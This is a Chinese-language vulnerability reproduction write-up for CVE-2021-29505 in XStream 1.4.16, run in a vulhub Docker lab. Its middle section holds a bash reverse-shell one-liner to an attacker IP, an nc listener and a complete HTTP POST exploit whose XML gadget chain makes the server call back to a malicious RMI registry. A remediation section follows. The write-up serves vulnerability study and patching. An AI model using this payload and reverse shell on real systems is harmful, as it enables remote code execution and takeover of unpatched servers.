

## 「xstream」CVE-2021-29505

## 简介

XStream是一个轻量级、简单易用的开源Java类库，它主要用于将对象序列化成XML（JSON）或反序列化为对象。

**编号：CVE-2021-29505**

XStream在解析XML文本时使用黑名单机制来防御反序列化漏洞，但是其 1.4.16及之前版本黑名单存在缺陷。攻击者可以操纵已处理的输入流并替换或注入对象，从而在服务器上执行本地命令。

## 影响版本

XStream <= 1.4.16

## 环境搭建

用docker拉取镜像：

执行如下命令启动一个SpringBoot+XStream的1.4.16的环境：

```bash
git clone https://github.com/vulhub/
cd xstream
cd cve-2021-29505
docker-compose up -d
```

然后访问本地8080端口：

![image-20210531090257672](http://imagesolo.oss-cn-beijing.aliyuncs.com/2021-05-31-010258.png)

简单测试：

![image-20210531094522268](http://imagesolo.oss-cn-beijing.aliyuncs.com/2021-05-31-014522.png)

## 漏洞复现

用ysoserial起一个恶意的RMI Registry

ysoserial项目地址 ：https://github.com/frohoff/ysoserial/releases

```bash
bash -i >& /dev/tcp/172.16.153.128/1234 0>&1
```

将需要执行的命令进行base64编码：http://www.jackson-t.ca/runtime-exec-payloads.html

开启监听1099端口：

![image-20210531092458191](http://imagesolo.oss-cn-beijing.aliyuncs.com/2021-05-31-012458.png)



同时vps开启接收反弹shell的监听端口：

```bash
nc -lvp 1234
```

exp如下：

```html
POST / HTTP/1.1
Host: 192.168.13.138:8080
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Content-Type: application/xml
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 3121



<java.util.PriorityQueue serialization='custom'>
    <unserializable-parents/>
    <java.util.PriorityQueue>
        <default>
            <size>2</size>
        </default>
        <int>3</int>
        <javax.naming.ldap.Rdn_-RdnEntry>
            <type>12345</type>
            <value class='com.sun.org.apache.xpath.internal.objects.XString'>
                <m__obj class='string'>com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content</m__obj>
            </value>
        </javax.naming.ldap.Rdn_-RdnEntry>
        <javax.naming.ldap.Rdn_-RdnEntry>
            <type>12345</type>
            <value class='com.sun.xml.internal.ws.api.message.Packet' serialization='custom'>
                <message class='com.sun.xml.internal.ws.message.saaj.SAAJMessage'>
                    <parsedMessage>true</parsedMessage>
                    <soapVersion>SOAP_11</soapVersion>
                    <bodyParts/>
                    <sm class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'>
                        <attachmentsInitialized>false</attachmentsInitialized>
                        <nullIter class='com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator'>
                            <aliases class='com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl'>
                                <candidates class='com.sun.jndi.rmi.registry.BindingEnumeration'>
                                    <names>
                                        <string>aa</string>
                                        <string>aa</string>
                                    </names>
                                    <ctx>
                                        <environment/>
                                        <registry class='sun.rmi.registry.RegistryImpl_Stub' serialization='custom'>
                                            <java.rmi.server.RemoteObject>
                                                <string>UnicastRef</string>
                                                <string>192.168.13.138</string>
                                                <int>1099</int>
                                                <long>0</long>
                                                <int>0</int>
                                                <long>0</long>
                                                <short>0</short>
                                                <boolean>false</boolean>
                                            </java.rmi.server.RemoteObject>
                                        </registry>
                                        <host>192.168.13.138</host>
                                        <port>1099</port>
                                    </ctx>
                                </candidates>
                            </aliases>
                        </nullIter>
                    </sm>
                </message>
            </value>
        </javax.naming.ldap.Rdn_-RdnEntry>
    </java.util.PriorityQueue>
</java.util.PriorityQueue>
```

tips：

- 在post请求中加入content-type:application/xml。

- 修改监听的ip和端口。

发包：

![image-20210531095343194](http://imagesolo.oss-cn-beijing.aliyuncs.com/2021-05-31-015343.png)

成功回显：

![image-20210531095427939](http://imagesolo.oss-cn-beijing.aliyuncs.com/2021-05-31-015428.png)

## **漏洞修复**

漏洞源于类 ：sun.rmi.registry.RegistryImpl_Stub

- 将xstream升级到1.4.17或以上版本（修改maven pom.xml文件版本）

```Java
<dependency>
    <groupId>com.thoughtworks.xstream</groupId>
    <artifactId>xstream</artifactId>
    <version>1.4.17</version>
</dependency>
```

- 使用XStream安全api设置反序列类的白名单。

  eg：

  ```Java
  
  XStream xstream = new XStream();
  //清除现有权限并启动白名单
  xstream.addPermission(NoTypePermission.NONE);
  //允许一些基础类
  xstream.addPermission(NullPermission.NULL);
  xstream.addPermission(PrimitiveTypePermission.PRIMITIVES);
  xstream.allowTypeHierarchy(Collection.class);
  //允许来自同一包的任何类型
  xstream.allowTypesByWildcard(new String[] {
      Blog.class.getPackage().getName()+".*"
  });
  // 允许自定义的业务类
  xstream.allowTypesHierarchy(Yewulei.class);
  Yewulei yw = (Yewulei)xstream.fromXML(new File("/tmp/yewu.xml"));
  ```

  